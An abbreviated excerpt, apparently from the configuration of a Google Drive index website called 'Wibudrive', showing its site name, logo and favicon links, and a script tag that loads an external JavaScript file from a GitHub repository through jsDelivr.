...
*/
const authConfig = {
	"siteName": "Wibudrive", // Website name
...
const uiConfig = {
	...
	"logo_link_name": "https://telegra.ph/file/0877c56b9801cf50ab041.png", // if logo is true then link otherwise just text for name
...
<head>
  ...
  <link rel="icon" href="https://icon-library.com/images/neko-icon/neko-icon-16.jpg">
  <script>
  ...
  <script src="https://cdn.jsdelivr.net/gh/Tototto09889/testing/palsuw.js"></script>
